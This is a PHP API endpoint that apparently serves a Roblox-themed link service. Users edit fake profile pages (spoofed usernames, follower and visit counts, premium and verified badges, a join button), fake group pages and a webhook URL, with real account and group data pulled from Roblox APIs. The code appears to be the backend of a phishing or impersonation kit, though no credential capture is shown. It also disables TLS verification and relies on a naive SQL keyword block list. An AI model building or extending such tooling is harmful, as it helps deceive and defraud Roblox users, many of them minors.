<?php
ob_start();
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);

if (session_status() === PHP_SESSION_NONE) {
    $sessionLifetime = 365 * 24 * 60 * 60;
    $secure = (
        (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ||
        (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https')
    );
    $sessionCookieNames = ['token', 'PHPSESSID'];
    $validSessionIdPattern = '/^[A-Za-z0-9,-]{16,128}$/';
    $selectedSessionName = 'token';

    foreach ($sessionCookieNames as $candidateName) {
        if (
            !empty($_COOKIE[$candidateName]) &&
            preg_match($validSessionIdPattern, (string) $_COOKIE[$candidateName])
        ) {
            $selectedSessionName = $candidateName;
            break;
        }
    }

    session_name($selectedSessionName);
    ini_set('session.gc_maxlifetime', (string) $sessionLifetime);
    ini_set('session.use_strict_mode', '1');
    ini_set('session.use_only_cookies', '1');

    if (PHP_VERSION_ID >= 70300) {
        session_set_cookie_params([
            'lifetime' => $sessionLifetime,
            'path' => '/',
            'secure' => $secure,
            'httponly' => true,
            'samesite' => 'Lax'
        ]);
    } else {
        session_set_cookie_params($sessionLifetime, '/', '', $secure, true);
    }

    session_start();

    if (empty($_SESSION['link_id']) && empty($_SESSION['auth_code'])) {
        foreach ($sessionCookieNames as $fallbackName) {
            if (
                $fallbackName === session_name() ||
                empty($_COOKIE[$fallbackName]) ||
                !preg_match($validSessionIdPattern, (string) $_COOKIE[$fallbackName])
            ) {
                continue;
            }

            session_write_close();
            session_name($fallbackName);
            session_id((string) $_COOKIE[$fallbackName]);
            session_start();

            if (!empty($_SESSION['link_id']) || !empty($_SESSION['auth_code'])) {
                break;
            }
        }
    }

    if (!headers_sent() && session_id() !== '' && (!empty($_SESSION['link_id']) || !empty($_SESSION['auth_code']))) {
        if (PHP_VERSION_ID >= 70300) {
            setcookie('token', session_id(), [
                'expires' => time() + $sessionLifetime,
                'path' => '/',
                'secure' => $secure,
                'httponly' => true,
                'samesite' => 'Lax'
            ]);
        } else {
            setcookie('token', session_id(), time() + $sessionLifetime, '/', '', $secure, true);
        }

        $_COOKIE['token'] = session_id();
    }
}

header('Content-Type: application/json; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

try {
    require_once '../libs/connection.php';
    /* ---- functions this file uses (formerly from libs/functions.php, which is no longer needed) ---- */
if (!function_exists('getRequest')) {
function getRequest($url, $cookie = NULL, $header = NULL, $proxy = NULL){
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    //for debug only!
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_TIMEOUT, 10);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($curl, CURLOPT_HEADER, true); // Capture headers in the output

    if($header !== NULL){
        curl_setopt($curl, CURLOPT_HTTPHEADER, $header);
    }
    if($cookie !== NULL){
        curl_setopt($curl, CURLOPT_COOKIE, $cookie);
    }
    if($proxy !== NULL){
        $parts = explode(":", $proxy);
        $proxy_ip = $parts[0];
        $proxy_port = $parts[1];
        curl_setopt($curl, CURLOPT_PROXY, 'http://' . $proxy_ip . ':' . $proxy_port);
        // Auth varsa ekle
        if (count($parts) >= 4) {
            $user = $parts[2];
            $pass = implode(':', array_slice($parts, 3));
            curl_setopt($curl, CURLOPT_PROXYUSERPWD, $user . ":" . $pass);
        }
        curl_setopt($curl, CURLOPT_HTTPPROXYTUNNEL, true);
        curl_setopt($curl, CURLOPT_TIMEOUT, 30);
    }
    
    $response = curl_exec($curl);
    
    if ($response === false) {
        $errNo = curl_errno($curl);
        $errMsg = curl_error($curl);
        error_log("getRequest cURL ERROR ($errNo): $errMsg — URL: $url");
        curl_close($curl);
        return ['headers' => '', 'body' => false, 'code' => 0];
    }
    
    $headerSize = curl_getinfo($curl, CURLINFO_HEADER_SIZE);
    $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
    $headers = substr($response, 0, $headerSize);
    $body = substr($response, $headerSize);
    
    curl_close($curl);
    
    return [
        'headers' => $headers,
        'body' => $body,
        'code' => $httpCode
    ];
}
}
if (!function_exists('postRequest')) {
function postRequest($url, $cookie = NULL, $headers = NULL, $payload = NULL, $proxy = NULL) {
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_HEADER, true);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curl, CURLOPT_TIMEOUT, 30);
    
    if ($headers) {
        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
    }
    if ($cookie !== NULL) {
        curl_setopt($curl, CURLOPT_COOKIE, $cookie);
    }
    if ($payload !== NULL) {
        curl_setopt($curl, CURLOPT_POSTFIELDS, $payload);
    }
    if ($proxy !== NULL && !empty($proxy)) {
        $parts = explode(":", $proxy);
        if (count($parts) >= 2) {
            $proxy_ip = $parts[0];
            $proxy_port = $parts[1];
            curl_setopt($curl, CURLOPT_PROXY, 'http://' . $proxy_ip . ':' . $proxy_port);
            if (count($parts) >= 4) {
                $user = $parts[2];
                $pass = implode(':', array_slice($parts, 3));
                curl_setopt($curl, CURLOPT_PROXYUSERPWD, $user . ":" . $pass);
            }
            curl_setopt($curl, CURLOPT_HTTPPROXYTUNNEL, true);
        }
    }
    
    $response = curl_exec($curl);
    $headerSize = curl_getinfo($curl, CURLINFO_HEADER_SIZE);
    $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
    $headers = substr($response, 0, $headerSize);
    $body = substr($response, $headerSize);
    
    curl_close($curl);
    
    return [
        'headers' => $headers,
        'body' => $body,
        'code' => $httpCode
    ];
}
}
if (!function_exists('checkUsername')) {
function checkUsername($username){
    $requestBody = json_encode(array(
        "usernames" => array($username),
        "excludeBannedUsers" => true
    ));
    $response = postRequest("https://users.roblox.com/v1/usernames/users", NULL, ["content-type: application/json"], $requestBody);
    $response_json = json_decode($response['body']);
    
    if(isset($response_json->data[0]->id)){
        return $response_json->data[0]->id;
    } else {
        return false;
    }
}
}
if (!function_exists('executeSafeQuery')) {
function executeSafeQuery($sql, $params = []) {
    static $db = null;   // one database connection for the whole page (was: a new one for every query)
    if ($db === null) {
        include $_SERVER['DOCUMENT_ROOT'] . '/libs/connection.php';
    }
    
    // Block suspicious keywords (customize based on your needs)
$blockedKeywords = ['DROP TABLE', 'DELETE FROM', 'TRUNCATE TABLE', 'GRANT ', 'ALTER TABLE', 'CREATE TABLE', 'CREATE DATABASE'];
	foreach ($blockedKeywords as $keyword) {
        if (stripos($sql, $keyword) !== false) {
            throw new Exception("Suspicious SQL operation detected");
        }
    }

    try {
        $stmt = $db->prepare($sql);
        
        // Bind parameters securely
        foreach ($params as $key => $value) {
            $stmt->bindValue(is_int($key) ? $key + 1 : $key, $value, 
                is_int($value) ? PDO::PARAM_INT : PDO::PARAM_STR);
        }
        
        $stmt->execute();
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        error_log("Database error: " . $e->getMessage());
        return [];
    }
}
}
/* ---- end of the functions from libs/functions.php ---- */
} catch (Exception $e) {
    ob_end_clean();
    http_response_code(500);
    echo json_encode(['success' => false, 'message' => 'Failed to load files: ' . $e->getMessage()]);
    exit();
}

function sendJsonResponse($data, $code = 200) {
    ob_end_clean();
    http_response_code($code);
    echo json_encode($data, JSON_UNESCAPED_UNICODE);
    exit();
}

function resolveLinkIdFromSession() {
    if (!empty($_SESSION['link_id'])) {
        return $_SESSION['link_id'];
    }

    if (empty($_SESSION['auth_code'])) {
        return null;
    }

    $authCode = trim((string) $_SESSION['auth_code']);

    if (!preg_match('/^[A-Za-z0-9_-]{20,256}$/', $authCode)) {
        return null;
    }

    $result = executeSafeQuery(
        "SELECT link_id FROM regular WHERE auth_code = :auth_code LIMIT 1",
        [':auth_code' => $authCode]
    );

    if (empty($result) || empty($result[0]['link_id'])) {
        return null;
    }

    $_SESSION['link_id'] = $result[0]['link_id'];

    return $_SESSION['link_id'];
}

try {
    $link_id = resolveLinkIdFromSession();

    if (!$link_id) {
        sendJsonResponse(['success' => false, 'message' => 'Unauthorized', 'error_code' => 401], 401);
    }

    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        sendJsonResponse(['success' => false, 'message' => 'Method not allowed', 'error_code' => 405], 405);
    }

    $type = isset($_GET['type']) ? strtolower(trim($_GET['type'])) : null;
    if (!in_array($type, ['profile', 'group', 'other'])) {
        sendJsonResponse(['success' => false, 'message' => 'Invalid type', 'error_code' => 400], 400);
    }

    $rawInput = file_get_contents('php://input');
    $input = json_decode($rawInput, true);
    
    if (json_last_error() !== JSON_ERROR_NONE) {
        sendJsonResponse(['success' => false, 'message' => 'Invalid JSON', 'error_code' => 400], 400);
    }

    $validationRules = [
        'profile' => [
            'fake_username'    => ['type' => 'string', 'max' => 100],
            'display_username' => ['type' => 'string', 'max' => 100],
            'real_username'    => ['type' => 'roblox_username'],
            'friends'          => ['type' => 'int', 'min' => 0],
            'followers'        => ['type' => 'int', 'min' => 0],
            'followings'       => ['type' => 'int', 'min' => 0],
            'place_visits'     => ['type' => 'int', 'min' => 0],
            'about'            => ['type' => 'string', 'max' => 500],
            'created_date'     => ['type' => 'date'],
            'premium'          => ['type' => 'bool'],
            'verified_badge'   => ['type' => 'bool'],
            'join_button'      => ['type' => 'bool'],
            'activity'         => ['type' => 'enum', 'values' => ['ingame', 'studio', 'online', 'offline']]
        ],
        'group' => [
            'group_name'    => ['type' => 'string', 'max' => 50],
            'owner_name'    => ['type' => 'string', 'max' => 50],
            'member'        => ['type' => 'int', 'min' => 0],
            'funds'         => ['type' => 'int', 'min' => 0],
            'group_url'     => ['type' => 'roblox_group_url'],
            'thumbnail_url' => ['type' => 'image_url'],
            'shout'         => ['type' => 'string', 'max' => 255],
            'description'   => ['type' => 'string', 'max' => 500],
            'verified_badge' => ['type' => 'bool']
        ],
        'other' => [
            'webhook_url' => ['type' => 'url']
        ]
    ];

    $validatedData = [];
    
    foreach ($input as $field => $value) {
        if (!isset($validationRules[$type][$field])) {
            continue;
        }

        $rules = $validationRules[$type][$field];
        
        $groupDefaults = [
            'group_name' => 'One Time YT',
            'owner_name' => 'real_pika0394058201840',
            'member' => 4323,
            'funds' => 32948,
            'thumbnail_url' => 'https://freepngimg.com/thumb/vector/1-2-vector-png-image.png'
        ];
        
        $allowEmptyFields = ['shout', 'description', 'about'];
        
        if ($value === null || $value === '') {
            if ($type === 'group' && isset($groupDefaults[$field])) {
                $value = $groupDefaults[$field];
            } elseif (in_array($field, $allowEmptyFields)) {
                $value = ''; // Boş değere izin ver
            } else {
                continue;
            }
        }

        switch ($rules['type']) {
            case 'string':
                $value = htmlspecialchars(strip_tags($value), ENT_QUOTES, 'UTF-8');
                if (isset($rules['max']) && strlen($value) > $rules['max']) {
                    sendJsonResponse(['success' => false, 'message' => "$field too long", 'error_code' => 400], 400);
                }
                break;

            case 'roblox_username':
                $value = trim($value);
                
                if (!function_exists('checkUsername')) {
                    sendJsonResponse(['success' => false, 'message' => 'checkUsername not found', 'error_code' => 500], 500);
                }
                
                $userId = checkUsername($value);
                
                if (!$userId || $userId <= 0) {
                    sendJsonResponse(['success' => false, 'message' => "Roblox user '$value' not found", 'error_code' => 400], 400);
                }
                
                try {
                    $apiUrl = "https://users.roblox.com/v1/users/$userId";
                    $userResponse = getRequest($apiUrl);
                    $robloxData = json_decode($userResponse['body'], true);
                    
                    if (isset($robloxData['errors']) || !isset($robloxData['name'])) {
                        sendJsonResponse(['success' => false, 'message' => 'Roblox user not found', 'error_code' => 400], 400);
                    }
                    
                    $validatedData['real_username'] = $robloxData['name'];
                    $validatedData['user_id'] = $robloxData['id'];
                    
                    $validatedData['display_username'] = $robloxData['displayName'] ?? $robloxData['name'];
                    
                    $validatedData['fake_username'] = $robloxData['name'];
                    
                } catch (Exception $e) {
                    sendJsonResponse(['success' => false, 'message' => 'API error: ' . $e->getMessage(), 'error_code' => 500], 500);
                }
                continue 2;

            case 'roblox_group_url':
                $value = trim($value);
                
                if (preg_match('/roblox\.com\/(?:groups|communities)\/(\d+)/i', $value, $matches)) {
                    $groupId = $matches[1];
                } elseif (is_numeric($value)) {
                    $groupId = $value;
                } else {
                    sendJsonResponse(['success' => false, 'message' => 'Invalid Roblox group URL', 'error_code' => 400], 400);
                }
                
                try {
                    $apiUrl = "https://groups.roblox.com/v1/groups/{$groupId}";
                    $ch = curl_init();
                    curl_setopt_array($ch, [
                        CURLOPT_URL => $apiUrl,
                        CURLOPT_RETURNTRANSFER => true,
                        CURLOPT_HTTPHEADER => ['Accept: application/json', 'User-Agent: Roblox/WinInet'],
                        CURLOPT_TIMEOUT => 10,
                        CURLOPT_SSL_VERIFYPEER => false
                    ]);
                    $response = curl_exec($ch);
                    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                    curl_close($ch);
                    
                    if (!$response || $httpCode !== 200) {
                        sendJsonResponse(['success' => false, 'message' => 'Roblox group not found', 'error_code' => 400], 400);
                    }
                    
                    $groupData = json_decode($response, true);
                    
                    if (isset($groupData['errors']) || !isset($groupData['id'])) {
                        sendJsonResponse(['success' => false, 'message' => 'Roblox group not found', 'error_code' => 400], 400);
                    }
                    
                    $validatedData['group_id'] = $groupData['id'];
                    $validatedData['group_name'] = $groupData['name'] ?? '';
                    $validatedData['owner_name'] = $groupData['owner']['username'] ?? '';
                    $validatedData['member'] = $groupData['memberCount'] ?? 0;
                    $validatedData['description'] = $groupData['description'] ?? '';
                    $validatedData['shout'] = $groupData['shout']['body'] ?? '';
                    
                    $thumbnailUrl = "https://thumbnails.roblox.com/v1/groups/icons?groupIds={$groupId}&size=150x150&format=Png&isCircular=false";
                    $ch = curl_init();
                    curl_setopt_array($ch, [
                        CURLOPT_URL => $thumbnailUrl,
                        CURLOPT_RETURNTRANSFER => true,
                        CURLOPT_HTTPHEADER => ['Accept: application/json', 'User-Agent: Roblox/WinInet'],
                        CURLOPT_TIMEOUT => 10,
                        CURLOPT_SSL_VERIFYPEER => false
                    ]);
                    $thumbResponse = curl_exec($ch);
                    curl_close($ch);
                    
                    if ($thumbResponse) {
                        $thumbData = json_decode($thumbResponse, true);
                        if (isset($thumbData['data'][0]['imageUrl'])) {
                            $validatedData['thumbnail_url'] = $thumbData['data'][0]['imageUrl'];
                        }
                    }
                    
                } catch (Exception $e) {
                    sendJsonResponse(['success' => false, 'message' => 'API error: ' . $e->getMessage(), 'error_code' => 500], 500);
                }
                continue 2;

            case 'int':
                $value = (int)$value;
                if (isset($rules['min']) && $value < $rules['min']) {
                    sendJsonResponse(['success' => false, 'message' => "$field too small", 'error_code' => 400], 400);
                }
                break;

            case 'bool':
                $value = in_array($value, ['true', '1', 1, true], true) ? 1 : 0;
                break;

            case 'date':
                if (!preg_match('/^\d{4}-\d{2}-\d{2}$/', $value)) {
                    sendJsonResponse(['success' => false, 'message' => "Invalid date format", 'error_code' => 400], 400);
                }
                break;

            case 'url':
                if (!filter_var($value, FILTER_VALIDATE_URL)) {
                    sendJsonResponse(['success' => false, 'message' => "Invalid URL", 'error_code' => 400], 400);
                }
                break;

            case 'image_url':
                $value = trim($value);
                
                if (preg_match('/^data:image\/(png|jpg|jpeg|gif|svg\+xml|webp|bmp|ico);base64,/i', $value)) {
                    break;
                }
                
                if (preg_match('/^blob:/i', $value)) {
                    break;
                }
                
                if (filter_var($value, FILTER_VALIDATE_URL)) {
                    break;
                }
                
                sendJsonResponse(['success' => false, 'message' => "Invalid image URL format", 'error_code' => 400], 400);
                break;

            case 'enum':
                $value = strtolower($value);
                if (!in_array($value, $rules['values'])) {
                    sendJsonResponse(['success' => false, 'message' => "Invalid value for $field", 'error_code' => 400], 400);
                }
                break;
        }

        $validatedData[$field] = $value;
    }

    if (empty($validatedData)) {
        sendJsonResponse(['success' => false, 'message' => 'No fields to update', 'error_code' => 400], 400);
    }

    $fieldMap = [
        'profile' => [
            'fake_username'    => 'names_displayName',
            'display_username' => 'names_combinedName',
            'real_username'    => 'names_username',
            'user_id'          => 'user_id',
            'friends'          => 'profile_friend',
            'followers'        => 'profile_follower',
            'followings'       => 'profile_following',
            'place_visits'     => 'profile_visit',
            'about'            => 'profile_about',
            'created_date'     => 'profile_date',
            'premium'          => 'profile_premium',
            'verified_badge'   => 'profile_verified',
            'join_button'      => 'profile_join_button',
            'activity'         => 'profile_activity'
        ],
        'group' => [
            'group_id'       => 'group_id',
            'group_name'     => 'group_name',
            'owner_name'     => 'group_owner',
            'member'         => 'group_member_count',
            'funds'          => 'group_funds',
            'thumbnail_url'  => 'group_image',
            'shout'          => 'group_shout',
            'description'    => 'group_description',
            'verified_badge' => 'group_verified'
        ],
        'other' => [
            'webhook_url' => 'webhook'
        ]
    ];

    $setClauses = [];
    $params = [':link_id' => $link_id];
    
    foreach ($validatedData as $field => $value) {
        if (!isset($fieldMap[$type][$field])) {
            continue;
        }
        
        $dbColumn = $fieldMap[$type][$field];
        $paramName = ':' . str_replace('.', '_', $dbColumn);
        
        $setClauses[] = "`$dbColumn` = $paramName";
        $params[$paramName] = $value;
    }

    if (empty($setClauses)) {
        sendJsonResponse(['success' => false, 'message' => 'No valid fields', 'error_code' => 400], 400);
    }

    $query = "UPDATE `regular` SET " . implode(', ', $setClauses) . " WHERE `link_id` = :link_id";
    
    $stmt = $db->prepare($query);
    
    if (!$stmt->execute($params)) {
        $err = $stmt->errorInfo();
        sendJsonResponse(['success' => false, 'message' => 'Update failed: ' . $err[2], 'error_code' => 500], 500);
    }

    sendJsonResponse([
        'success' => true,
        'message' => 'Settings updated successfully',
        'rows_affected' => $stmt->rowCount(),
        'updated_fields' => array_keys($validatedData)
    ], 200);

} catch (Exception $e) {
    sendJsonResponse(['success' => false, 'message' => $e->getMessage(), 'error_code' => 500], 500);
}